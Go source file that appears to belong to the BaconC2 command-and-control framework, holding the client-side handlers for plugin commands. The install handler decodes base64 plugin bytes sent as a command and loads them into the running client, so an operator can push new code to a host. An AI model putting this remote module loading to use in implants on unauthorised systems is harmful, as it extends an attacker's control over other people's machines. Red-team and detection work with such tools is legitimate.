package plugins

import (
	"encoding/base64"
	"encoding/json"
	"fmt"

	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/plugins"
)

type ClientPluginCommands struct {
	manager *plugins.PluginManager
}

func NewPluginCommands(manager *plugins.PluginManager) *ClientPluginCommands {
	return &ClientPluginCommands{
		manager: manager,
	}
}

func (pc *ClientPluginCommands) HandlePluginInstall(cmd models.Command) models.CommandResult {
	if len(cmd.Args) < 2 {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     "Error: plugin_install requires pluginName and encodedData",
			ResultType: models.ResultTypeError,
		}
	}

	pluginName := cmd.Args[0]
	encodedData := cmd.Args[1]
	expectedHash := ""
	if len(cmd.Args) >= 3 {
		expectedHash = cmd.Args[2]
	}

	data, err := base64.StdEncoding.DecodeString(encodedData)
	if err != nil {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Failed to decode plugin data: %v", err),
			ResultType: models.ResultTypeError,
		}
	}

	
	if expectedHash != "" {
		actualHash := plugins.CalculateHashBytes(data)
		if actualHash != expectedHash {
			return models.CommandResult{
				ID:         cmd.ID,
				Status:     models.CommandStatusFailed,
				Output:     fmt.Sprintf("Hash mismatch: expected %s, got %s", expectedHash, actualHash),
				ResultType: models.ResultTypeError,
			}
		}
	}

	
	if err := pc.manager.LoadPluginFromBytes(pluginName, data); err != nil {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Failed to load plugin: %v", err),
			ResultType: models.ResultTypeError,
		}
	}

	return models.CommandResult{
		ID:         cmd.ID,
		Status:     models.CommandStatusCompleted,
		Output:     fmt.Sprintf("Plugin '%s' installed and loaded successfully", pluginName),
		ResultType: models.ResultTypeText,
	}
}

func (pc *ClientPluginCommands) HandlePluginUnload(cmd models.Command) models.CommandResult {
	if len(cmd.Args) == 0 {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     "Error: Plugin name required",
			ResultType: models.ResultTypeError,
		}
	}

	pluginName := cmd.Args[0]

	if err := pc.manager.UnloadPlugin(pluginName); err != nil {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Failed to unload plugin '%s': %v", pluginName, err),
			ResultType: models.ResultTypeError,
		}
	}

	return models.CommandResult{
		ID:         cmd.ID,
		Status:     models.CommandStatusCompleted,
		Output:     fmt.Sprintf("Plugin '%s' unloaded successfully", pluginName),
		ResultType: models.ResultTypeText,
	}
}

func (pc *ClientPluginCommands) HandlePluginList(cmd models.Command) models.CommandResult {
	plugins := pc.manager.ListPlugins()

	if len(plugins) == 0 {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusCompleted,
			Output:     "No plugins loaded",
			ResultType: models.ResultTypeText,
		}
	}

	data, err := json.MarshalIndent(plugins, "", "  ")
	if err != nil {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Failed to marshal plugin list: %v", err),
			ResultType: models.ResultTypeError,
		}
	}

	return models.CommandResult{
		ID:         cmd.ID,
		Status:     models.CommandStatusCompleted,
		Output:     string(data),
		ResultType: models.ResultTypeJSON,
	}
}

func (pc *ClientPluginCommands) HandlePluginStatus(cmd models.Command) models.CommandResult {
	if len(cmd.Args) == 0 {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     "Error: Plugin name required",
			ResultType: models.ResultTypeError,
		}
	}

	pluginName := cmd.Args[0]

	status, err := pc.manager.GetPluginStatus(pluginName)
	if err != nil {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Failed to get plugin status: %v", err),
			ResultType: models.ResultTypeError,
		}
	}

	return models.CommandResult{
		ID:         cmd.ID,
		Status:     models.CommandStatusCompleted,
		Output:     fmt.Sprintf("Plugin '%s' status: %s", pluginName, status),
		ResultType: models.ResultTypeText,
	}
}

func (pc *ClientPluginCommands) HandlePluginInfo(cmd models.Command) models.CommandResult {
	if len(cmd.Args) == 0 {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     "Error: Plugin name required",
			ResultType: models.ResultTypeError,
		}
	}

	pluginName := cmd.Args[0]

	plugin, exists := pc.manager.GetRegistry().Get(pluginName)
	if !exists {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Plugin '%s' not found", pluginName),
			ResultType: models.ResultTypeError,
		}
	}

	metadata := plugin.GetMetadata()
	data, err := json.MarshalIndent(metadata, "", "  ")
	if err != nil {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Failed to marshal plugin info: %v", err),
			ResultType: models.ResultTypeError,
		}
	}

	return models.CommandResult{
		ID:         cmd.ID,
		Status:     models.CommandStatusCompleted,
		Output:     string(data),
		ResultType: models.ResultTypeJSON,
	}
}
